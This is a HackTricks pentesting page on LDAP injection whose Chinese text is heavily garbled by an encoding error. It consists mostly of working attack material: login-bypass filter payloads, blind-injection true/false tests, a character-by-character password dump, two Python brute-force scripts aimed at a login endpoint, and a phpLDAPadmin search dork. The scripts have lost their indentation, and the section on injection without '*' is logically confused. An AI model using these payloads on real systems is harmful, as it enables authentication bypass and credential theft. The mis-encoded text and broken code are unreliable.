# LDAPæ³¨å…¥

## LDAPæ³¨å…¥

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**èµé‡‘çŒäººæç¤º**ï¼š**æ³¨å†Œ**Intigritiï¼Œä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§**èµé‡‘çŒäººå¹³å°**ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬çš„[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾**$100,000**çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

## LDAPæ³¨å…¥

### **LDAP**

**å¦‚æœä½ æƒ³çŸ¥é“ä»€ä¹ˆæ˜¯LDAPï¼Œè¯·è®¿é—®ä»¥ä¸‹é¡µé¢ï¼š**

{% content-ref url="../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

**LDAPæ³¨å…¥**æ˜¯ä¸€ç§ç”¨äºåˆ©ç”¨åŸºäº**ç”¨æˆ·è¾“å…¥**æ„å»º**LDAPè¯­å¥**çš„**Web**åº”ç”¨ç¨‹åºçš„æ”»å‡»ã€‚å½“åº”ç”¨ç¨‹åºæœªèƒ½æ­£ç¡®å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œ**æ¸…ç†**æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æœ¬åœ°ä»£ç†ä¿®æ”¹LDAPè¯­å¥ã€‚

{% file src="../.gitbook/assets/en-blackhat-europe-2008-ldap-injection-blind-ldap-injection.pdf" %}

**è¿‡æ»¤å™¨** = ( filtercomp )\
**Filtercomp** = and / or / not / item\
**And** = & filterlist\
**Or** = |filterlist\
**Not** = ! filter\
**Filterlist** = 1\*filter\
**Item**= simple / present / substring\
**Simple** = attr filtertype assertionvalue\
**Filtertype** = _'=' / '\~=' / '>=' / '<='_\
**Present** = attr = \*\
**Substring** = attr â€=â€ \[initial] \* \[final]\
**Initial** = assertionvalue\
**Final** = assertionvalue\
**(&)** = ç»å¯¹TRUE\
**(|)** = ç»å¯¹FALSE

ä¾‹å¦‚ï¼š\
`(&(!(objectClass=Impresoras))(uid=s*))`\
`(&(objectClass=user)(uid=*))`

ä½ å¯ä»¥è®¿é—®æ•°æ®åº“ï¼Œå…¶ä¸­å¯èƒ½åŒ…å«è®¸å¤šä¸åŒç±»å‹çš„ä¿¡æ¯ã€‚

**OpenLDAP**ï¼šå¦‚æœæœ‰2ä¸ªè¿‡æ»¤å™¨åˆ°è¾¾ï¼Œåªæ‰§è¡Œç¬¬ä¸€ä¸ªè¿‡æ»¤å™¨ã€‚\
**ADAMæˆ–Microsoft LDS**ï¼šä½¿ç”¨2ä¸ªè¿‡æ»¤å™¨ä¼šæŠ›å‡ºé”™è¯¯ã€‚\
**SunOne Directory Server 5.0**ï¼šæ‰§è¡Œä¸¤ä¸ªè¿‡æ»¤å™¨ã€‚

**å‘é€æ­£ç¡®è¯­æ³•çš„è¿‡æ»¤å™¨éå¸¸é‡è¦ï¼Œå¦åˆ™å°†æŠ›å‡ºé”™è¯¯ã€‚æœ€å¥½åªå‘é€ä¸€ä¸ªè¿‡æ»¤å™¨ã€‚**

è¿‡æ»¤å™¨å¿…é¡»ä»¥`&`æˆ–`|`å¼€å¤´\
ç¤ºä¾‹ï¼š`(&(directory=val1)(folder=public))`

`(&(objectClass=VALUE1)(type=Epson*))`\
`VALUE1 = *)(ObjectClass=*))(&(objectClass=void`

ç„¶åï¼š`(&(objectClass=`**`*)(ObjectClass=*))`**å°†æ˜¯ç¬¬ä¸€ä¸ªè¿‡æ»¤å™¨ï¼ˆæ‰§è¡Œçš„è¿‡æ»¤å™¨ï¼‰ã€‚

### ç™»å½•ç»•è¿‡

LDAPæ”¯æŒå¤šç§æ ¼å¼æ¥å­˜å‚¨å¯†ç ï¼šæ˜æ–‡ã€md5ã€smd5ã€sh1ã€shaã€cryptã€‚å› æ­¤ï¼Œæ— è®ºä½ åœ¨å¯†ç ä¸­æ’å…¥ä»€ä¹ˆï¼Œå®ƒéƒ½ä¼šè¢«å“ˆå¸Œå¤„ç†ã€‚
```bash
user=*
password=*
--> (&(user=*)(password=*))
# The asterisks are great in LDAPi
```

```bash
user=*)(&
password=*)(&
--> (&(user=*)(&)(password=*)(&))
```

```bash
user=*)(|(&
pass=pwd)
--> (&(user=*)(|(&)(pass=pwd))
```

```bash
user=*)(|(password=*
password=test)
--> (&(user=*)(|(password=*)(password=test))
```

```bash
user=*))%00
pass=any
--> (&(user=*))%00 --> Nothing more is executed
```

```bash
user=admin)(&)
password=pwd
--> (&(user=admin)(&))(password=pwd) #Can through an error
```

```bash
username = admin)(!(&(|
pass = any))
--> (&(uid= admin)(!(& (|) (webpassword=any)))) â€”> As (|) is FALSE then the user is admin and the password check is True.
```

```bash
username=*
password=*)(&
--> (&(user=*)(password=*)(&))
```

```bash
username=admin))(|(|
password=any
--> (&(uid=admin)) (| (|) (webpassword=any))
```
#### åˆ—è¡¨

* [LDAP\_FUZZ](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_FUZZ.txt)
* [LDAP å±æ€§](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt)
* [LDAP PosixAccount å±æ€§](https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html)

### ç›² LDAP æ³¨å…¥

æ‚¨å¯ä»¥å¼ºåˆ¶è¿”å› False æˆ– True å“åº”æ¥æ£€æŸ¥æ˜¯å¦è¿”å›ä»»ä½•æ•°æ®ï¼Œå¹¶ç¡®è®¤å¯èƒ½å­˜åœ¨ç›² LDAP æ³¨å…¥ï¼š
```bash
#This will result on True, so some information will be shown
Payload: *)(objectClass=*))(&objectClass=void
Final query: (&(objectClass= *)(objectClass=*))(&objectClass=void )(type=Pepi*))
```

```bash
#This will result on True, so no information will be returned or shown
Payload: void)(objectClass=void))(&objectClass=void
Final query: (&(objectClass= void)(objectClass=void))(&objectClass=void )(type=Pepi*))
```
#### è½¬å‚¨æ•°æ®

æ‚¨å¯ä»¥è¿­ä»£ASCIIå­—æ¯ã€æ•°å­—å’Œç¬¦å·ï¼š
```bash
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
```
### è„šæœ¬

#### **å‘ç°æœ‰æ•ˆçš„LDAPå­—æ®µ**

LDAPå¯¹è±¡**é»˜è®¤åŒ…å«å¤šä¸ªå±æ€§**ï¼Œå¯ç”¨äº**ä¿å­˜ä¿¡æ¯**ã€‚æ‚¨å¯ä»¥å°è¯•**æš´åŠ›ç ´è§£æ‰€æœ‰è¿™äº›å±æ€§ä»¥æå–ä¿¡æ¯**ã€‚æ‚¨å¯ä»¥åœ¨[**æ­¤å¤„æ‰¾åˆ°é»˜è®¤LDAPå±æ€§çš„åˆ—è¡¨**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt)ã€‚
```python
#!/usr/bin/python3
import requests
import string
from time import sleep
import sys

proxy = { "http": "localhost:8080" }
url = "http://10.10.10.10/login.php"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

for attribute in attributes: #Extract all attributes
value = ""
finish = False
while not finish:
for char in alphabet: #In each possition test each possible printable char
query = f"*)({attribute}={value}{char}*"
data = {'login':query, 'password':'bla'}
r = requests.post(url, data=data, proxies=proxy)
sys.stdout.write(f"\r{attribute}: {value}{char}")
#sleep(0.5) #Avoid brute-force bans
if "Cannot login" in r.text:
value += str(char)
break

if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
finish = True
print()
```
#### **ç‰¹æ®Šçš„ç›²LDAPæ³¨å…¥ï¼ˆæ— éœ€"\*"ï¼‰**

This technique is used when the application filters the wildcard character "\*". However, it still allows us to perform a blind LDAP injection attack by leveraging other LDAP filter operators.

å½“åº”ç”¨ç¨‹åºè¿‡æ»¤é€šé…ç¬¦å­—ç¬¦"\*"æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æ­¤æŠ€æœ¯ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥åˆ©ç”¨å…¶ä»–LDAPè¿‡æ»¤å™¨æ“ä½œç¬¦æ¥æ‰§è¡Œç›²LDAPæ³¨å…¥æ”»å‡»ã€‚

The basic idea is to use the "!" operator to negate the result of an LDAP filter condition. By injecting a payload that causes the condition to evaluate to false, we can bypass the filter and retrieve sensitive information.

åŸºæœ¬æ€æƒ³æ˜¯ä½¿ç”¨"!"æ“ä½œç¬¦æ¥å¦å®šLDAPè¿‡æ»¤å™¨æ¡ä»¶çš„ç»“æœã€‚é€šè¿‡æ³¨å…¥ä¸€ä¸ªå¯¼è‡´æ¡ä»¶è¯„ä¼°ä¸ºfalseçš„æœ‰æ•ˆè´Ÿè½½ï¼Œæˆ‘ä»¬å¯ä»¥ç»•è¿‡è¿‡æ»¤å™¨å¹¶æ£€ç´¢æ•æ„Ÿä¿¡æ¯ã€‚

For example, consider the following LDAP filter used to authenticate a user:

ä¾‹å¦‚ï¼Œè€ƒè™‘ä»¥ä¸‹ç”¨äºéªŒè¯ç”¨æˆ·çš„LDAPè¿‡æ»¤å™¨ï¼š

```
(&(username=admin)(password=pass))
```

If the application filters the wildcard character "\*", we can't use the usual payload like `(username=*)(password=*)` to bypass the filter. However, we can use the "!" operator to negate the result of the condition:

å¦‚æœåº”ç”¨ç¨‹åºè¿‡æ»¤é€šé…ç¬¦å­—ç¬¦"\*"ï¼Œæˆ‘ä»¬æ— æ³•ä½¿ç”¨é€šå¸¸çš„æœ‰æ•ˆè´Ÿè½½`(username=*)(password=*)`æ¥ç»•è¿‡è¿‡æ»¤å™¨ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨"!"æ“ä½œç¬¦æ¥å¦å®šæ¡ä»¶çš„ç»“æœï¼š

```
(&(username=admin)(!(password=pass)))
```

This payload will evaluate to false, allowing us to bypass the filter and potentially retrieve sensitive information.

è¿™ä¸ªæœ‰æ•ˆè´Ÿè½½å°†è¯„ä¼°ä¸ºfalseï¼Œå…è®¸æˆ‘ä»¬ç»•è¿‡è¿‡æ»¤å™¨å¹¶å¯èƒ½æ£€ç´¢æ•æ„Ÿä¿¡æ¯ã€‚

Keep in mind that the specific syntax and operators may vary depending on the LDAP server implementation. It's important to understand the LDAP filter syntax and the available operators for the target server.

è¯·è®°ä½ï¼Œå…·ä½“çš„è¯­æ³•å’Œæ“ä½œç¬¦å¯èƒ½å› LDAPæœåŠ¡å™¨å®ç°è€Œå¼‚ã€‚é‡è¦çš„æ˜¯è¦äº†è§£ç›®æ ‡æœåŠ¡å™¨çš„LDAPè¿‡æ»¤å™¨è¯­æ³•å’Œå¯ç”¨çš„æ“ä½œç¬¦ã€‚
```python
#!/usr/bin/python3

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
print("[i] Looking for number " + str(i))
for char in alphabet:
r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)
if ("TRUE CONDITION" in r.text):
flag += char
print("[+] Flag: " + flag)
break
```
### Google Dorks

### è°·æ­Œé»‘å®¢æœç´¢è¯­æ³•

Google Dorksæ˜¯ä¸€ç§ä½¿ç”¨è°·æ­Œæœç´¢å¼•æ“çš„é«˜çº§æœç´¢æŠ€æœ¯ï¼Œç”¨äºå‘ç°ç‰¹å®šçš„ä¿¡æ¯å’Œæ¼æ´ã€‚é»‘å®¢å¯ä»¥ä½¿ç”¨Google Dorksæ¥æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯ã€æ¼æ´å’Œå…¶ä»–æœ‰ä»·å€¼çš„ç›®æ ‡ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„Google Dorksç¤ºä¾‹ï¼š

- `site:`ï¼šé™åˆ¶æœç´¢ç»“æœä¸ºç‰¹å®šç½‘ç«™ã€‚
- `filetype:`ï¼šé™åˆ¶æœç´¢ç»“æœä¸ºç‰¹å®šæ–‡ä»¶ç±»å‹ã€‚
- `intitle:`ï¼šé™åˆ¶æœç´¢ç»“æœä¸ºåŒ…å«ç‰¹å®šæ ‡é¢˜çš„é¡µé¢ã€‚
- `inurl:`ï¼šé™åˆ¶æœç´¢ç»“æœä¸ºåŒ…å«ç‰¹å®šURLçš„é¡µé¢ã€‚
- `intext:`ï¼šé™åˆ¶æœç´¢ç»“æœä¸ºåŒ…å«ç‰¹å®šæ–‡æœ¬çš„é¡µé¢ã€‚

é»‘å®¢å¯ä»¥ä½¿ç”¨è¿™äº›Google Dorksæ¥æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ã€é…ç½®æ–‡ä»¶ã€ç™»å½•å‡­è¯ç­‰ã€‚ä»–ä»¬è¿˜å¯ä»¥ä½¿ç”¨è¿™äº›Dorksæ¥æŸ¥æ‰¾ç‰¹å®šçš„æ¼æ´ï¼Œå¦‚SQLæ³¨å…¥ã€LDAPæ³¨å…¥ç­‰ã€‚é»‘å®¢å¯ä»¥é€šè¿‡åœ¨æœç´¢ä¸­ä½¿ç”¨è¿™äº›Dorksæ¥å®šä½ç›®æ ‡ï¼Œå¹¶åˆ©ç”¨å‘ç°çš„æ¼æ´è¿›è¡Œæ”»å‡»ã€‚

é»‘å®¢ä½¿ç”¨Google Dorksæ—¶éœ€è¦å°å¿ƒï¼Œå› ä¸ºè°·æ­Œæœç´¢å¼•æ“å¯èƒ½ä¼šè®°å½•æœç´¢å†å²å’Œæ´»åŠ¨ã€‚æ­¤å¤–ï¼Œæ»¥ç”¨Google Dorkså¯èƒ½ä¼šè¿åæ³•å¾‹å’Œé“å¾·è§„èŒƒã€‚å› æ­¤ï¼Œé»‘å®¢åœ¨ä½¿ç”¨Google Dorksæ—¶åº”è¯¥éµå®ˆæ³•å¾‹å’Œé“å¾·å‡†åˆ™ï¼Œå¹¶ä»…é™äºåˆæ³•çš„æ¸—é€æµ‹è¯•æ´»åŠ¨ã€‚
```bash
intitle:"phpLDAPadmin" inurl:cmd.php
```
### æ›´å¤šæœ‰æ•ˆè½½è·

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**èµé‡‘çŒäººæç¤º**: **æ³¨å†Œ** Intigritiï¼Œä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§èµé‡‘çŒäººå¹³å°ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬çš„ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾ **$100,000** çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­ **å®£ä¼ ä½ çš„å…¬å¸**ï¼Ÿæˆ–è€…æƒ³è¦è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF**ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨ **Twitter** ä¸Š **å…³æ³¨** æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
